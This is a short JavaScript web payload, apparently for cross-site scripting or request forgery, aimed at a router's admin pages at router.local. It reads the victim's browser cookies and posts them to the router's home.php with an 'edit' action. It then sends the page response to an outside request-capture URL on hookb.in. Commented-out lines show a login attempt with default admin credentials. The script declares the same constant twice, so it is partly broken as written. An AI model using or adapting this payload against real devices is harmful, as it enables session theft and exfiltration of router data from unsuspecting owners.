const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
const cook = document.cookie;
http.open('POST', 'http://router.local/home.php', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/2q9jWbG2Xmfdzq88RbPJ', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};
const cook = document.cookie;
http.send('action=edit&'+cook);
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

